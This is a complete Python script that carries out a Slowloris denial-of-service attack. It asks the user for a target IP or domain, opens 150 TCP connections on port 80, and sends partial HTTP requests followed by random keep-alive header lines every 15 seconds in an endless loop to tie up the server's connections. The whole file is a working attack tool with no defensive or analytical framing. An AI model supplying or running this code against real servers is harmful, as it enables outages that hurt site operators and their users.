import socket  # Used for creating network connections and sending data over TCP/IP.
import time  # Used for managing sleep intervals between actions.
import random  # Used for generating random numbers, specifically for the keep-alive headers.

def create_socket(target, port):
    """Create a TCP socket and connect to the target on the specified port."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket
        sock.settimeout(4)  # Set a timeout for the socket connection
        sock.connect((target, port))  # Connect to the target IP and port
        sock.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode("utf-8"))  # Send initial HTTP GET request
        return sock  # Return the socket if successful
    except socket.error:
        return None  # Return None if there's an error in socket creation or connection

def send_keep_alive(sock):
    """Send a keep-alive header to the server to maintain the connection."""
    try:
        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8")) # Send a random keep-alive header
    except socket.error:
        return False  # Return False if there's an error sending the data
    return True  # Return True if the header was sent successfully

def slowloris_attack(target, port=80, num_sockets=100, sleep_time=15):
    """Execute a Slowloris attack by keeping connections alive."""

    sockets = [create_socket(target, port) for _ in range(num_sockets)]  #Create a list of sockets to hold open connections
    while True:
        
        for i, sock in enumerate(sockets): # Loop through the sockets and send keep-alive messages
            if not send_keep_alive(sock):  # If keep-alive fails
                sockets[i] = create_socket(target, port)  # Replace with a new socket
        time.sleep(sleep_time)  # Sleep for the specified time before sending the next keep-alive

if __name__=="__main__":
    target=input("Enter the target IP or domain: ")  # Get the target IP or domain from user input
    slowloris_attack(target, port=80, num_sockets=150, sleep_time=15)  # Start the Slowloris attack
